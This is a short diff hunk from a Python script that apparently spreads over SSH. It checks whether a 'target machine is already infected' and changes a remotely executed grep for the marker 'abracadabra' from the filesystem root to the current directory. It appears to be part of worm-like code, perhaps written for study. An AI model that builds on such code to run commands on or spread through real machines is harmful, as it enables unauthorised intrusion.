@@ -107,7 +107,7 @@ while True:
                         print("\nThe target machine is already infected\n")      
                         continue
                     
-                    cmd = "grep -rl abracadabra /"
+                    cmd = "grep -rl abracadabra ."
                     # Now let's look for files that contain the string 'abracadabra'
                     stdin, stdout, stderr = ssh.exec_command(cmd)
                     error = stderr.readlines()
